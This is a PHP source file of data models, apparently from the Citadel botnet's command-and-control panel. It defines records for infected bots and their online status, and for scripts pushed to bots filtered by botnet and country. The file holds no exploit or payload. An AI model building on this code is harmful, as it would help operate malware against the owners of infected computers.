<?php namespace Citadel\Models;

/**
 * @table botnet_list
 */
class Bot { # TODO: add all fields
    /**
     * @field
     * @type varchar(128) not null
     */
    public $bot_id;

    /**
     * @field
     * @type varchar(32) not null
     */
    public $botnet;

//    public $bot_version;

//    public $net_latency;
//    public $tcpport_s1;

//    public $time_localbias;
    public $os_version;

    /** Get OS in a user-friendly way
     */
    function getOS(){
        return osDataToString($this->os_version);
    }

//    public $language_id;

//    public $ipv4_list;
//    public $ipv6_list;
//    public $ipv4;
//    public $country;

    /** First time the bot was seen online
     * @field
     * @type int unsigned
     */
    public $rtime_first;

    /** Last time the bot was seen online
     * @field
     * @type int unsigned
     */
    public $rtime_last;

    /** The number of seconds the bot has been online for
     * Only if: isOnline()==true
     * @field
     * @type int unsigned
     */
    public $rtime_online;

    /** Is the bot online?
     * @return bool
     */
    function isOnline(){
        return $this->rtime_last >= ONLINE_TIME_MIN;
    }

//    public $flag_new;
//    public $flag_used;
//    public $flags;

    /** Comment for the bot
     * @field
     * @type tinytext not null
     */
    public $comment;

    /** Bot 'favorite' status:
     * -1 trash, 0 default, 1 favorite
     * @field
     * @type tinyint not null
     */
    public $favorite;

    /** Battery info binary data
     * @field
     * @type int unsigned
     */
    public $battery;
}

/** Bot script
 * @table botnet_scripts
 */
class BotScript {
    /** Script ID, PK
     * @primary
     * @type autoinc
     * @var int
     */
    public $id;

    /** Binary script id
     * @field
     * @type varbinary not null
     * @var string[16]
     */
    public $extern_id;

    /** Generate a valid extern_id for the script
     * @param string $data Hash source
     * @return string[16]
     */
    static function gen_extern_id($data){
        $microtime = microtime(true);
        $time = floor($microtime); # time, integral part
        $msec = $microtime - $time; # time, floating part
        $hash = md5($data, true); # hash

        return
            pack('N', $time). # 4
            pack('n', floor($msec*65535)). # 2
            substr($hash, 0, 10) # 10
            ;
    }

    /** Script name
     * @field
     * @type varchar not null
     * @var string
     */
    public $name;

    /** Is the script enabled?
     * @field
     * @type tinyint
     * @var bool
     */
    public $flag_enabled;

    /** Script creation time
     * @field
     * @type int-timestamp
     * @var \DateTime
     */
    public $time_created;

    /** Max number of bots allowed to execute the script.
     * `0` means no limit
     * @field
     * @type int unsigned
     * @var int
     */
    public $send_limit;

    /** bots white list
     * @field
     * @type stupidsqlarray
     * @var string[]
     */
    public $bots_wl = array();

    /** bots black list
     * @field
     * @type stupidsqlarray
     * @var string[]
     */
    public $bots_bl = array();

    /** botnets white list
     * @field
     * @type stupidsqlarray
     * @var string[]
     */
    public $botnets_wl = array();

    /** botnets black list
     * @field
     * @type stupidsqlarray
     * @var string[]
     */
    public $botnets_bl = array();

    /** countries white list
     * @field
     * @type stupidsqlarray
     * @var string[]
     */
    public $countries_wl = array();

    /** countries black list
     * @field
     * @type stupidsqlarray
     * @var string[]
     */
    public $countries_bl = array();

    /** Script text
     * @field
     * @type text
     * @var string
     */
    public $script_text;

    /** Script bin. Usually, equal to script_text
     * @field
     * @type text
     * @var string
     */
    public $script_bin;
}
